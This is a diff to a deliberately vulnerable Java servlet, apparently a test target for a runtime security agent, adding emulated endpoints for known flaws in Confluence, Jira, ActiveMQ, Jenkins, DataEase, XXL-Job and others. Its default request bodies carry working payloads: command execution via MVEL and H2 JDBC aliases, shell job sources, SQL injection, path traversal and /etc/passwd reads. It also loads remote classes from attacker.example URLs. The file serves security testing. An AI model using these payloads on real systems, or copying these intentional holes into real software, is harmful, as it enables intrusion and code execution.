@@ -92,6 +92,8 @@ import org.xml.sax.InputSource;
       "/ws_utc/*",
       "/api/*",
       "/fileserver/*",
+      "/jars/*",
+      "/dataSetParam/*",
       "/dataease/*",
       "/nacos/*",
       "/solr/*",
@@ -99,7 +101,9 @@ import org.xml.sax.InputSource;
       "/jmreport/*",
       "/h2-console/*",
       "/cas/*",
+      "/hello/*",
       "/neo4j-shell/*",
+      "/admin/message.jsp",
       "/invoker/*",
       "/jbossmq-httpil/*",
       "/flex2gateway/*",
@@ -107,6 +111,9 @@ import org.xml.sax.InputSource;
       "/cf_scripts/*",
       "*.action",
       "/exploit",
+      "/graphql",
+      "/gremlin",
+      "/gs-guide-websocket/*",
       "/onlinePreview",
       "/test",
       "/"
@@ -130,13 +137,57 @@ public final class VulnerableServlet extends HttpServlet {
                     ? "/fastjson"
                     : "/exploit".equals(request.getServletPath())
                         ? "/exploit"
-                        : request.getServletPath().endsWith(".action")
-                            ? "/struts-action"
-                            : springCloudGatewayRouteRequest(request)
-                                ? "/spring-cloud-gateway-route"
-                                : springDataRestJsonPatchRequest(request)
-                                    ? "/spring-data-rest-json-patch"
-                                    : request.getPathInfo() == null ? "/ui" : request.getPathInfo();
+                        : "/graphql".equals(request.getServletPath())
+                            ? "/graphql"
+                            : "/gremlin".equals(request.getServletPath())
+                                ? "/gremlin"
+                                : jiraContactAdministratorsRequest(request)
+                                    ? "/jira-contact-administrators"
+                                    : weblogicWeakPasswordFileReadRequest(request)
+                                        ? "/weblogic-file-read"
+                                        : dubboHttpInvokerRequest(request)
+                                            ? "/dubbo-http-invoker"
+                                            : sparkRestSubmissionRequest(request)
+                                                ? "/spark-rest-submission"
+                                            : request.getServletPath().endsWith(".action")
+                                                ? "/struts-action"
+                                                : springCloudGatewayRouteRequest(request)
+                                                    ? "/spring-cloud-gateway-route"
+                                                    : springMessagingSockJsRequest(request)
+                                                        ? "/spring-messaging-stomp-selector"
+                                                        : springDataRestJsonPatchRequest(request)
+                                                            ? "/spring-data-rest-json-patch"
+                                                            : confluenceMacroPreviewRequest(request)
+                                                            ? "/confluence-macro-preview"
+                                                            : meterSphereTestCaseListRequest(request)
+                                                            ? "/metersphere-testcase-list"
+                                                            : meterSpherePluginAddRequest(request)
+                                                                ? "/metersphere-plugin-add"
+                                                                : xxlJobRunRequest(request)
+                                                                    ? "/xxl-job-run"
+                                                                    : xxlJobHessianApiRequest(request)
+                                                                        ? "/xxl-job-hessian-api"
+                                                                        : ofbizXmlRpcRequest(request)
+                                                                            ? "/ofbiz-xmlrpc"
+                                                                            : dataEaseDatasourceValidateRequest(request)
+                                                                                ? "/dataease-datasource-validate"
+                                                                                : dataEaseUserInfoRequest(request)
+                                                                                    ? "/dataease-user-info"
+                                                                                    : ofbizProgramExportRequest(request)
+                                                                                        ? "/ofbiz-program-export"
+                                                                                        : strutsXmlRestRequest(request)
+                                                                                            ? "/struts-xml-rest"
+                                                                                            : activeMqObjectMessageBrowseRequest(request)
+                                                                                                ? "/activemq-object-message-browse"
+                                                                                                : jenkinsCliSignedObjectRequest(request)
+                                                                                                    ? "/jenkins-cli-signed-object"
+                                                                                                    : tomcatSessionDeserializeRequest(request)
+                                                                                                        ? "/tomcat-session-deserialize"
+                                                                                                        : unomiContextRequest(request)
+                                                                                                            ? "/context.json"
+                                                                                                            : request.getPathInfo() == null
+                                                                                                                ? "/ui"
+                                                                                                                : request.getPathInfo();
     boolean agentRequestEntered = false;
     try {
       if (!action.equals("/blocked")) {
@@ -159,6 +210,7 @@ public final class VulnerableServlet extends HttpServlet {
             case "/file/read" -> readFile(request);
             case "/file/read-sensitive" -> readFilePath(Path.of("/etc/passwd"));
             case "/file/read-outside" -> readFilePath(Path.of("/etc/hosts"));
+            case "/weblogic-file-read" -> weblogicWeakPasswordFileRead(request);
             case "/file/write" -> writeFile(request);
             case "/file/write-reflect" -> writeFileReflect();
             case "/archive" -> extractArchive(request);
@@ -171,9 +223,24 @@ public final class VulnerableServlet extends HttpServlet {
             case "/jndi" -> jndiLookup(request);
             case "/jaas/config" -> jaasConfig(request);
             case "/classloader/url" -> remoteUrlClassLoader(request);
+            case "/classloader/rmi-codebase" -> rmiClassLoaderCodebase(request);
             case "/spring/config" -> loadSpringConfig(request);
             case "/spring-cloud-gateway-route" -> springCloudGatewayRouteConfig(request);
+            case "/spring-messaging-stomp-selector" -> springMessagingSockJs(request);
             case "/spring-data-rest-json-patch" -> springDataRestJsonPatch(request);
+            case "/confluence-macro-preview" -> confluenceMacroPreview(request);
+            case "/metersphere-testcase-list" -> meterSphereTestCaseList(request);
+            case "/metersphere-plugin-add" -> meterSpherePluginAdd(request);
+            case "/xxl-job-run" -> xxlJobRun(request);
+            case "/xxl-job-hessian-api" -> xxlJobHessianApi(request);
+            case "/ofbiz-xmlrpc" -> ofbizXmlRpc(request);
+            case "/dataease-datasource-validate" -> dataEaseDatasourceValidate(request);
+            case "/dataease-user-info" -> dataEaseUserInfo(request);
+            case "/ofbiz-program-export" -> ofbizProgramExport(request);
+            case "/struts-xml-rest" -> strutsXmlRest(request);
+            case "/activemq-object-message-browse" -> activeMqObjectMessageBrowse(request);
+            case "/jenkins-cli-signed-object" -> jenkinsCliSignedObject(request);
+            case "/tomcat-session-deserialize" -> tomcatSessionDeserialize(request);
             case "/jmx/invoke" -> invokeJmxRemoteConfig(request);
             case "/jmx/write" -> invokeJmxScriptWrite(request);
             case "/sql" -> sqlQuery(request);
@@ -182,12 +249,15 @@ public final class VulnerableServlet extends HttpServlet {
             case "/jdbc/mysql" -> mysqlJdbcUrl(request);
             case "/deserialize" -> deserialize();
             case "/deserialize/polymorphic" -> polymorphicType(request);
+            case "/dubbo-http-invoker" -> dubboHttpInvoker(request);
             case "/amf" -> {
               if ("/flex2gateway".equals(request.getServletPath())) {
                 yield coldfusionAmfDeserialize(request);
               }
               yield "unknown action: " + action;
             }
+            case "/gremlin" -> hugeGraphGremlin(request);
+            case "/jira-contact-administrators" -> jiraContactAdministrators(request);
             case "/xml/decoder" -> xmlDecoderRuntime(request);
             case "/xml/decoder-webshell" -> xmlDecoderWebshell(request);
             case "/cxf-aegis-test" -> cxfAegisXopAttachment(request);
@@ -197,6 +267,7 @@ public final class VulnerableServlet extends HttpServlet {
             case "/jxpath" -> evaluateJXPath(request);
             case "/java/compile" -> compileJavaSource(request);
             case "/template/velocity" -> renderVelocity(request);
+            case "/spark-rest-submission" -> sparkRestSubmission(request);
             case "/xxe" -> parseXxe(request);
             case "/wms" -> {
               if ("/geoserver".equals(request.getServletPath())) {
@@ -222,6 +293,12 @@ public final class VulnerableServlet extends HttpServlet {
               }
               yield "unknown action: " + action;
             }
+            case "/adminapi/accessmanager.cfc" -> {
+              if ("/CFIDE".equals(request.getServletPath())) {
+                yield coldfusionWddxAccessManager(request);
+              }
+              yield "unknown action: " + action;
+            }
             case "/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc" -> {
               if ("/cf_scripts".equals(request.getServletPath())) {
                 yield "coldfusion-iedit=" + value(request, "_variables", "");
@@ -237,6 +314,30 @@ public final class VulnerableServlet extends HttpServlet {
             case "/jsonws/invoke" -> {
               if ("/api".equals(request.getServletPath())) {
                 yield "liferay-jsonws=" + value(request, "cmd", "");
+              }
+              yield "unknown action: " + action;
+            }
+            case "/geojson" -> {
+              if ("/api".equals(request.getServletPath())) {
+                yield metabaseGeojson(request);
+              }
+              yield "unknown action: " + action;
+            }
+            case "/setup/validate" -> {
+              if ("/api".equals(request.getServletPath())) {
+                yield metabaseSetupValidate(request);
+              }
+              yield "unknown action: " + action;
+            }
+            case "/verification", "/verification/", "/verification;swagger-ui", "/verification;swagger-ui/" -> {
+              if ("/dataSetParam".equals(request.getServletPath())) {
+                yield ajReportDataSetParamVerification(request);
+              }
+              yield "unknown action: " + action;
+            }
+            case "/openwire" -> {
+              if ("/api".equals(request.getServletPath())) {
+                yield activeMqOpenWireProtocolClass(request);
               }
               yield "unknown action: " + action;
             }
@@ -267,6 +368,8 @@ public final class VulnerableServlet extends HttpServlet {
             case "/struts-action" -> strutsAction(request);
             case "/fastjson" -> fastjsonParse(request);
             case "/exploit" -> jacksonExploit(request);
+            case "/graphql" -> skyWalkingGraphql(request);
+            case "/context.json" -> unomiContext(request);
             case "/queryFieldBySql" -> {
               if ("/jmreport".equals(request.getServletPath())) {
                 yield jimuReportQueryFieldBySql(request);
@@ -327,6 +430,12 @@ public final class VulnerableServlet extends HttpServlet {
               }
               yield "unknown action: " + action;
             }
+            case "/upload" -> {
+              if ("/jars".equals(request.getServletPath())) {
+                yield flinkJarUpload(request);
+              }
+              yield "unknown action: " + action;
+            }
             case "/jolokia", "/jolokia/" -> {
               if ("/api".equals(request.getServletPath())) {
                 yield activemqJolokiaMBeanInvoke(request);
@@ -377,6 +486,10 @@ public final class VulnerableServlet extends HttpServlet {
       throws ServletException, IOException {
     String method = request.getMethod();
     if (springDataRestJsonPatchRequest(request) && "PATCH".equalsIgnoreCase(method)) {
+      doGet(request, response);
+      return;
+    }
+    if (tomcatDefaultServletPutRequest(request) && "PUT".equalsIgnoreCase(method)) {
       doGet(request, response);
       return;
     }
@@ -458,6 +571,15 @@ public final class VulnerableServlet extends HttpServlet {
       }
     }
     return firstLine(Files.readString(path));
+  }
+
+  private static boolean weblogicWeakPasswordFileReadRequest(HttpServletRequest request) {
+    return requestPathWithoutContext(request).equals("/hello/file.jsp");
+  }
+
+  private static String weblogicWeakPasswordFileRead(HttpServletRequest request)
+      throws IOException {
+    return readFile(request);
   }
 
   private static String writeFile(HttpServletRequest request) throws IOException {
@@ -601,6 +723,41 @@ public final class VulnerableServlet extends HttpServlet {
     }
   }
 
+  private static String metabaseGeojson(HttpServletRequest request) throws Exception {
+    String target = value(request, "url", "file:////etc/passwd");
+    URL url = URI.create(target).toURL();
+    if ("file".equalsIgnoreCase(url.getProtocol())) {
+      hook("beforeFileRead", new Class<?>[] {String.class}, target);
+    }
+    var connection = url.openConnection();
+    connection.setConnectTimeout(200);
+    connection.setReadTimeout(200);
+    try (var stream = connection.getInputStream()) {
+      return "metabase-geojson=" + firstLine(new String(stream.readNBytes(80), StandardCharsets.UTF_8));
+    }
+  }
+
+  private static String metabaseSetupValidate(HttpServletRequest request) throws Exception {
+    String body = requestBody(request);
+    if (body.isBlank()) {
+      body = metabaseSetupValidateBody();
+    }
+    hook(
+        "beforeSyntheticHttpRequestWithBody",
+        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
+        request.getMethod(),
+        requestPathWithoutContext(request),
+        valueOrDefault(request.getQueryString(), ""),
+        Map.of(),
+        Map.of(
+            "content-type",
+            valueOrDefault(request.getHeader("Content-Type"), "application/json"),
+            "user-agent",
+            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
+        body);
+    return "metabase-setup-validate=" + body.length();
+  }
+
   private static String weblogicUddiExplorerSsrf(HttpServletRequest request) throws Exception {
     String target =
         value(
@@ -698,12 +855,283 @@ public final class VulnerableServlet extends HttpServlet {
     return "druid-kafka-jaas-configs=" + configs.size();
   }
 
+  private static String hugeGraphGremlin(HttpServletRequest request) throws Exception {
+    String body = requestBody(request);
+    if (body.isBlank()) {
+      body = hugeGraphGremlinBody();
+    }
+    hook(
+        "beforeSyntheticHttpRequestWithBody",
+        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
+        request.getMethod(),
+        requestPathWithoutContext(request),
+        valueOrDefault(request.getQueryString(), ""),
+        Map.of(),
+        Map.of(
+            "content-type",
+            valueOrDefault(request.getHeader("Content-Type"), "application/json"),
+            "user-agent",
+            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
+        body);
+    return "hugegraph-gremlin=" + body.length();
+  }
+
+  private static boolean jiraContactAdministratorsRequest(HttpServletRequest request) {
+    if (!"POST".equalsIgnoreCase(request.getMethod())) {
+      return false;
+    }
+    String path = requestPathWithoutContext(request);
+    return path.equals("/secure/ContactAdministrators.jspa")
+        || path.equals("/secure/ContactAdministrators!default.jspa");
+  }
+
+  private static String jiraContactAdministrators(HttpServletRequest request) throws Exception {
+    String subject = value(request, "subject", "help");
+    Map<String, List<String>> parameters =
+        Map.of(
+            "from",
+            List.of(value(request, "from", "test@test.com")),
+            "subject",
+            List.of(subject),
+            "details",
+            List.of(value(request, "details", "v")),
+            "atl_token",
+            List.of(value(request, "atl_token", "token")));
+    hook(
+        "beforeSyntheticHttpRequest",
+        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
+        request.getMethod(),
+        requestPathWithoutContext(request),
+        valueOrDefault(request.getQueryString(), ""),
+        parameters,
+        Map.of(
+            "content-type",
+            valueOrDefault(
+                request.getHeader("Content-Type"), "application/x-www-form-urlencoded"),
+            "user-agent",
+            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")));
+    return "jira-contact-template=" + subject.length();
+  }
+
+  private static boolean unomiContextRequest(HttpServletRequest request) {
+    if (!"POST".equalsIgnoreCase(request.getMethod())) {
+      return false;
+    }
+    return requestPathWithoutContext(request).equals("/context.json");
+  }
+
+  private static String unomiContext(HttpServletRequest request) throws Exception {
+    String body = requestBody(request);
+    if (body.isBlank()) {
+      body =
+          "{\"filters\":[{\"id\":\"sample\",\"filters\":[{\"condition\":{\"parameterValues\":{\"\":\""
+              + "script::Runtime r = Runtime.getRuntime(); r.exec(\\\"touch /tmp/mvel\\\");"
+              + "\"},\"type\":\"profilePropertyCondition\"}}]}],\"sessionId\":\"sample\"}";
+    }
+    hook(
+        "beforeSyntheticHttpRequestWithBody",
+        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
+        request.getMethod(),
+        requestPathWithoutContext(request),
+        valueOrDefault(request.getQueryString(), ""),
+        Map.of(),
+        Map.of(
+            "content-type",
+            valueOrDefault(request.getHeader("Content-Type"), "application/json"),
+            "user-agent",
+            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
+        body);
+    return "unomi-context=" + body.length();
+  }
+
+  private static String ajReportDataSetParamVerification(HttpServletRequest request)
+      throws Exception {
+    String body = requestBody(request);
+    if (body.isBlank()) {
+      body = ajReportValidationRulesBody();
+    }
+    hook(
+        "beforeSyntheticHttpRequestWithBody",
+        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
+        request.getMethod(),
+        requestPathWithoutContext(request),
+        valueOrDefault(request.getQueryString(), ""),
+        Map.of(),
+        Map.of(
+            "content-type",
+            valueOrDefault(request.getHeader("Content-Type"), "application/json;charset=UTF-8"),
+            "user-agent",
+            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
+        body);
+    return "aj-report-validation-rules=" + body.length();
+  }
+
+  private static String skyWalkingGraphql(HttpServletRequest request) throws Exception {
+    String body = requestBody(request);
+    if (body.isBlank()) {
+      body = skyWalkingGraphqlSqlIdentifierBody();
+    }
+    hook(
+        "beforeSyntheticHttpRequestWithBody",
+        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
+        request.getMethod(),
+        requestPathWithoutContext(request),
+        valueOrDefault(request.getQueryString(), ""),
+        Map.of(),
+        Map.of(
+            "content-type",
+            valueOrDefault(request.getHeader("Content-Type"), "application/json"),
+            "user-agent",
+            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
+        body);
+    return "skywalking-graphql=" + body.length();
+  }
+
+  private static boolean strutsXmlRestRequest(HttpServletRequest request) {
+    if (!"POST".equalsIgnoreCase(request.getMethod())) {
+      return false;
+    }
+    String contentType = valueOrDefault(request.getHeader("Content-Type"), "").toLowerCase(Locale.ROOT);
+    return requestPathWithoutContext(request).equals("/orders/3/edit")
+        && contentType.contains("xml");
+  }
+
+  private static String strutsXmlRest(HttpServletRequest request) throws Exception {
+    String body = requestBody(request);
+    if (body.isBlank()) {
+      body = strutsXmlPolymorphicGadgetBody();
+    }
+    hook(
+        "beforeSyntheticHttpRequestWithBody",
+        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
+        request.getMethod(),
+        requestPathWithoutContext(request),
+        valueOrDefault(request.getQueryString(), ""),
+        Map.of(),
+        Map.of(
+            "content-type",
+            valueOrDefault(request.getHeader("Content-Type"), "application/xml"),
+            "user-agent",
+            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
+        body);
+    return "struts-xml-rest=" + body.length();
+  }
+
+  private static boolean activeMqObjectMessageBrowseRequest(HttpServletRequest request) {
+    if (!"GET".equalsIgnoreCase(request.getMethod())) {
+      return false;
+    }
+    return requestPathWithoutContext(request).equals("/admin/message.jsp");
+  }
+
+  private static String activeMqObjectMessageBrowse(HttpServletRequest request) throws Exception {
+    hook(
+        "beforeSyntheticDeserializationClass",
+        new Class<?>[] {String.class, List.class},
+        "com.rometools.rome.feed.impl.ToStringBean",
+        List.of(
+            "org.apache.activemq.command.ActiveMQObjectMessage",
+            "org.apache.activemq.util.ClassLoadingAwareObjectInputStream",
+            "java.io.ObjectInputStream",
+            "org.apache.activemq.web.MessageServletSupport"));
+    return "activemq-object-message-browse="
+        + value(request, "JMSDestination", "event")
+        + ":"
+        + value(request, "JMSMessageID", "ID:1");
+  }
+
+  private static String activeMqOpenWireProtocolClass(HttpServletRequest request) throws Exception {
+    String className =
+        value(request, "class", "org.springframework.context.support.ClassPathXmlApplicationContext");
+    String xml = value(request, "xml", "http://attacker.example/poc.xml");
+    hook(
+        "beforeProtocolClassInstantiation",
+        new Class<?>[] {String.class, String.class, Object.class},
+        "OpenWire",
+        className,
+        xml);
+    return "activemq-openwire=" + className + ":" + xml;
+  }
+
+  private static boolean jenkinsCliSignedObjectRequest(HttpServletRequest request) {
+    if (!"POST".equalsIgnoreCase(request.getMethod())) {
+      return false;
+    }
+    return requestPathWithoutContext(request).equals("/cli");
+  }
+
+  private static String jenkinsCliSignedObject(HttpServletRequest request) throws Exception {
+    request.getInputStream().readAllBytes();
+    hook(
+        "beforeSyntheticDeserializationClass",
+        new Class<?>[] {String.class, List.class},
+        "java.security.SignedObject",
+        List.of(
+            "hudson.cli.CLICommand",
+            "hudson.cli.CliManagerImpl",
+            "hudson.remoting.ObjectInputStreamEx",
+            "java.io.ObjectInputStream"));
+    return "jenkins-cli-signed-object";
+  }
+
+  private static boolean tomcatSessionDeserializeRequest(HttpServletRequest request) {
+    if (!"GET".equalsIgnoreCase(request.getMethod())) {
+      return false;
+    }
+    if (!requestPathWithoutContext(request).equals("/")) {
+      return false;
+    }
+    String sessionId = cookieValue(request, "JSESSIONID");
+    return !sessionId.isBlank() && sessionId.startsWith(".");
+  }
+
+  private static String tomcatSessionDeserialize(HttpServletRequest request) throws Exception {
+    String sessionId = cookieValue(request, "JSESSIONID");
+    hook(
+        "beforeSessionDeserialization",
+        new Class<?>[] {String.class, String.class},
+        valueOrDefault(sessionId, ".deserialize"),
+        "TomcatFileStore");
+    return "tomcat-session-deserialize=" + valueOrDefault(sessionId, ".deserialize");
+  }
+
+  private static boolean tomcatDefaultServletPutRequest(HttpServletRequest request) {
+    if (!"PUT".equalsIgnoreCase(request.getMethod())) {
+      return false;
+    }
+    String path = requestPathWithoutContext(request).toLowerCase(Locale.ROOT);
+    return path.equals("/deserialize/session")
+        || path.endsWith(".jsp")
+        || path.contains(".jsp/")
+        || path.contains(".jsp;");
+  }
+
+  private static String cookieValue(HttpServletRequest request, String name) {
+    String cookie = valueOrDefault(request.getHeader("Cookie"), "");
+    if (cookie.isBlank()) {
+      return "";
+    }
+    for (String part : cookie.split(";")) {
+      String[] pieces = part.trim().split("=", 2);
+      if (pieces.length == 2 && pieces[0].equals(name)) {
+        return pieces[1];
+      }
+    }
+    return "";
+  }
+
   private static String remoteUrlClassLoader(HttpServletRequest request) throws Exception {
     URL codebase = new URL(value(request, "codebase", "http://attacker.example/evil.jar"));
     try (URLClassLoader loader =
         new URLClassLoader(new URL[] {codebase}, VulnerableServlet.class.getClassLoader())) {
       return "classloader=" + firstLine(String.valueOf(loader));
     }
+  }
+
+  private static String rmiClassLoaderCodebase(HttpServletRequest request) throws Exception {
+    String codebase = value(request, "codebase", "http://attacker.example/Exploit");
+    hook("beforeRmiClassLoaderCodebase", new Class<?>[] {String.class}, codebase);
+    return "rmi-codebase=" + codebase.length();
   }
 
   private static String loadSpringConfig(HttpServletRequest request) {
@@ -748,6 +1176,32 @@ public final class VulnerableServlet extends HttpServlet {
     return "spring-cloud-gateway-route=" + body.length();
   }
 
+  private static boolean springMessagingSockJsRequest(HttpServletRequest request) {
+    if (!"POST".equalsIgnoreCase(request.getMethod())) {
+      return false;
+    }
+    String path = requestPathWithoutContext(request);
+    return path.startsWith("/gs-guide-websocket/") && path.endsWith("/xhr_send");
+  }
+
+  private static String springMessagingSockJs(HttpServletRequest request) throws Exception {
+    String body = requestBody(request);
+    hook(
+        "beforeSyntheticHttpRequestWithBody",
+        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
+        request.getMethod(),
+        requestPathWithoutContext(request),
+        valueOrDefault(request.getQueryString(), ""),
+        Map.of(),
+        Map.of(
+            "content-type",
+            valueOrDefault(request.getHeader("Content-Type"), "application/json"),
+            "user-agent",
+            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
+        body);
+    return "spring-messaging-stomp-selector=" + body.length();
+  }
+
   private static boolean springDataRestJsonPatchRequest(HttpServletRequest request) {
     if (!"PATCH".equalsIgnoreCase(request.getMethod())) {
       return false;
@@ -780,6 +1234,295 @@ public final class VulnerableServlet extends HttpServlet {
             valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
         body);
     return "spring-data-rest-json-patch=" + body.length();
+  }
+
+  private static boolean confluenceMacroPreviewRequest(HttpServletRequest request) {
+    if (!"POST".equalsIgnoreCase(request.getMethod())) {
+      return false;
+    }
+    String path = request.getRequestURI();
+    String context = request.getContextPath();
+    if (context != null && !context.isBlank() && path.startsWith(context)) {
+      path = path.substring(context.length());
+    }
+    return path.equals("/rest/tinymce/1/macro/preview");
+  }
+
+  private static String confluenceMacroPreview(HttpServletRequest request) throws Exception {
+    String body = requestBody(request);
+    if (body.isBlank()) {
+      body =
+          "{\"contentId\":\"786458\",\"macro\":{\"name\":\"widget\",\"body\":\"\",\"params\":{\"url\":\"https://www.viddler.com/v/23464dc6\",\"width\":\"1000\",\"height\":\"1000\",\"_template\":\". /web.xml\"}}}";
+    }
+    hook(
+        "beforeSyntheticHttpRequestWithBody",
+        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
+        request.getMethod(),
+        request.getRequestURI(),
+        valueOrDefault(request.getQueryString(), ""),
+        Map.of(),
+        Map.of(
+            "content-type",
+            valueOrDefault(request.getHeader("Content-Type"), "application/json; charset=utf-8"),
+            "user-agent",
+            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
+        body);
+    return "confluence-macro-preview=" + body.length();
+  }
+
+  private static boolean meterSphereTestCaseListRequest(HttpServletRequest request) {
+    if (!"POST".equalsIgnoreCase(request.getMethod())) {
+      return false;
+    }
+    String path = requestPathWithoutContext(request);
+    return path.startsWith("/test/case/list/");
+  }
+
+  private static String meterSphereTestCaseList(HttpServletRequest request) throws Exception {
+    String body = requestBody(request);
+    if (body.isBlank()) {
+      body =
+          "{\"orders\":[{\"name\":\"name\",\"type\":\",if(1=1,sleep(2),0)\"}],"
+              + "\"components\":[{\"key\":\"name\",\"name\":\"MsTableSearchInput\"}],"
+              + "\"filters\":{\"reviewStatus\":[\"Prepare\",\"Pass\",\"UnPass\"]}}";
+    }
+    hook(
+        "beforeSyntheticHttpRequestWithBody",
+        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
+        request.getMethod(),
+        request.getRequestURI(),
+        valueOrDefault(request.getQueryString(), ""),
+        Map.of(),
+        Map.of(
+            "content-type",
+            valueOrDefault(request.getHeader("Content-Type"), "application/json"),
+            "user-agent",
+            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
+        body);
+    return "metersphere-testcase-list=" + body.length();
+  }
+
+  private static boolean meterSpherePluginAddRequest(HttpServletRequest request) {
+    if (!"POST".equalsIgnoreCase(request.getMethod())) {
+      return false;
+    }
+    return requestPathWithoutContext(request).equals("/plugin/add");
+  }
+
+  private static String meterSpherePluginAdd(HttpServletRequest request) throws Exception {
+    String contentType = valueOrDefault(request.getHeader("Content-Type"), "");
+    String normalizedContentType = contentType.toLowerCase(Locale.ROOT);
+    if (!normalizedContentType.startsWith("multipart/form-data")
+        || !normalizedContentType.contains("boundary=")) {
+      hook("beforeFileUpload", new Class<?>[] {String.class}, value(request, "filename", "Evil.jar"));
+      return "metersphere-plugin-add=1";
+    }
+    int submittedFiles = 0;
+    for (Part part : request.getParts()) {
+      if (part.getSubmittedFileName() != null) {
+        submittedFiles++;
+      }
+    }
+    return "metersphere-plugin-add=" + submittedFiles;
+  }
+
+  private static String flinkJarUpload(HttpServletRequest request) throws Exception {
+    String contentType = valueOrDefault(request.getHeader("Content-Type"), "");
+    String normalizedContentType = contentType.toLowerCase(Locale.ROOT);
+    if (!normalizedContentType.startsWith("multipart/form-data")
+        || !normalizedContentType.contains("boundary=")) {
+      hook("beforeFileUpload", new Class<?>[] {String.class}, value(request, "filename", "../../../../../../tmp/success"));
+      return "flink-jar-upload=1";
+    }
+    int submittedFiles = 0;
+    for (Part part : request.getParts()) {
+      if (part.getSubmittedFileName() != null) {
+        submittedFiles++;
+      }
+    }
+    return "flink-jar-upload=" + submittedFiles;
+  }
+
+  private static boolean xxlJobRunRequest(HttpServletRequest request) {
+    if (!"POST".equalsIgnoreCase(request.getMethod())) {
+      return false;
+    }
+    return requestPathWithoutContext(request).equals("/run");
+  }
+
+  private static String xxlJobRun(HttpServletRequest request) throws Exception {
+    String body = requestBody(request);
+    if (body.isBlank()) {
+      body =
+          "{\"jobId\":1,\"executorHandler\":\"demoJobHandler\",\"executorParams\":\"demoJobHandler\","
+              + "\"executorBlockStrategy\":\"COVER_EARLY\",\"executorTimeout\":0,\"logId\":1,"
+              + "\"logDateTime\":1586629003729,\"glueType\":\"GLUE_SHELL\","
+              + "\"glueSource\":\"touch /tmp/success\",\"glueUpdatetime\":1586699003758,"
+              + "\"broadcastIndex\":0,\"broadcastTotal\":0}";
+    }
+    hook(
+        "beforeSyntheticHttpRequestWithBody",
+        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
+        request.getMethod(),
+        request.getRequestURI(),
+        valueOrDefault(request.getQueryString(), ""),
+        Map.of(),
+        Map.of(
+            "content-type",
+            valueOrDefault(request.getHeader("Content-Type"), "application/json"),
+            "user-agent",
+            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
+        body);
+    return "xxl-job-run=" + body.length();
+  }
+
+  private static boolean xxlJobHessianApiRequest(HttpServletRequest request) {
+    if (!"POST".equalsIgnoreCase(request.getMethod())) {
+      return false;
+    }
+    String contentType = valueOrDefault(request.getHeader("Content-Type"), "").toLowerCase(Locale.ROOT);
+    return requestPathWithoutContext(request).equals("/xxl-job-admin/api")
+        && contentType.contains("hessian");
+  }
+
+  private static String xxlJobHessianApi(HttpServletRequest request) throws Exception {
+    byte[] body = request.getInputStream().readAllBytes();
+    String type = value(request, "class", "org.apache.commons.beanutils.BeanComparator");
+    hook("beforeHessianType", new Class<?>[] {String.class}, type);
+    return "xxl-job-hessian-api=" + body.length;
+  }
+
+  private static boolean ofbizXmlRpcRequest(HttpServletRequest request) {
+    if (!"POST".equalsIgnoreCase(request.getMethod())) {
+      return false;
+    }
+    return requestPathWithoutContext(request).equals("/webtools/control/xmlrpc");
+  }
+
+  private static String ofbizXmlRpc(HttpServletRequest request) throws Exception {
+    String body = requestBody(request);
+    if (body.isBlank()) {
+      body =
+          "<?xml version=\"1.0\"?><methodCall><methodName>ping</methodName><params><param>"
+              + "<value><serializable>rO0ABXNyAA==</serializable></value></param></params>"
+              + "</methodCall>";
+    }
+    if (body.toLowerCase(Locale.ROOT).contains("<serializable>")) {
+      hook("beforeXmlRpcSerializableValue", new Class<?>[] {String.class}, "ApacheXmlRpc");
+    }
+    return "ofbiz-xmlrpc=" + body.length();
+  }
+
+  private static boolean dataEaseDatasourceValidateRequest(HttpServletRequest request) {
+    if (!"POST".equalsIgnoreCase(request.getMethod())) {
+      return false;
+    }
+    return requestPathWithoutContext(request).equals("/de2api/datasource/validate");
+  }
+
+  private static String dataEaseDatasourceValidate(HttpServletRequest request) throws Exception {
+    String body = requestBody(request);
+    if (body.isBlank()) {
+      String jdbc =
+          "jdbc:h2:mem:pwn;MODE=MSSQLServer;INIT=CREATE ALIAS EXEC AS $$void exec()"
+              + " throws java.io.IOException { Runtime.getRuntime().exec(new String[]{\"touch\","
+              + "\"/tmp/pwned\"})\\; }$$\\;CALL EXEC()";
+      String configuration =
+          "{\"jdbc\":\""
+              + jsonString(jdbc)
+              + "\",\"username\":\"\",\"password\":\"\",\"driver\":\"org.h2.Driver\"}";
+      body =
+          "{\"name\":\"p1\",\"type\":\"h2\",\"configuration\":\""
+              + Base64.getEncoder().encodeToString(configuration.getBytes(StandardCharsets.UTF_8))
+              + "\"}";
+    }
+    hook(
+        "beforeSyntheticHttpRequestWithBody",
+        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class, String.class},
+        request.getMethod(),
+        requestPathWithoutContext(request),
+        valueOrDefault(request.getQueryString(), ""),
+        Map.of(),
+        Map.of(
+            "content-type",
+            valueOrDefault(request.getHeader("Content-Type"), "application/json"),
+            "user-agent",
+            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0"),
+            "x-de-token",
+            valueOrDefault(request.getHeader("X-DE-TOKEN"), "")),
+        body);
+    return "dataease-datasource-validate=" + body.length();
+  }
+
